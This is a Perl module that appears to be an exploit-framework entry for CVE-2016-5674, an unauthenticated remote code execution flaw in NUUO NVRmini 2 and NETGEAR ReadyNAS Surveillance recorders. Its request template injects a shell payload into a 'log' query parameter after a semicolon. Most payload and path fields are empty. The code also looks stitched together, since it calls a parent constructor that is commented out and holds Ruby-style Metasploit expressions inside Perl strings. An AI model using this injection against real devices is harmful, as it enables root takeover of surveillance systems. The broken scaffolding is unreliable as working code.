package MSFExploits::Exploits::NUUO::MSF::NuuoNvrminiUnauthRce;
# use parent qw(MSFExploits::Exploit MSFExploits::Services::NUUO);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use Coro qw( async );

# # use MSFExploits::Functions::Basic;
# # use MSFExploits::Functions::Errors;
# # use MSFExploits::Functions::Content;

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   my ( $requester, $database ) = @_;

   my $name = "NuuoNvrminiUnauthRce";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2016-5674",
  DESCRIPTION => "

        The NVRmini 2 Network Video Recorder and the ReadyNAS Surveillance application are vulnerable

        to an unauthenticated remote code execution on the exposed web administration interface.

        This results in code execution as root in the NVRmini and the 'admin' user in ReadyNAS.

        This exploit has been tested on several versions of the NVRmini 2 and the ReadyNAS Surveillance.

        It probably also works on the NVRsolo and other Nuuo devices, but it has not been tested

        in those devices.

      ",
  METHOD => "GET",
  MSF_MODULE => "nuuo_nvrmini_unauth_rce",
  PATH => "log=rand_text_alpha(8+rand(8))+;+payload&",
  REFERENCES => [
    "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/nuuo-nvr-vulns.txt",
    "http://seclists.org/bugtraq/2016/Aug/45",
  ],
  TITLE => "NUUO NVRmini 2 / NETGEAR ReadyNAS Surveillance Unauthenticated Remote Code Execution",
  VARIABLES => {
    'ECHO' =>       { DESCRIPTION => "", VALUE => "" },
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($requester, $database, $name, $DETECTION, $EXPLOIT, @_);
}

return 1;
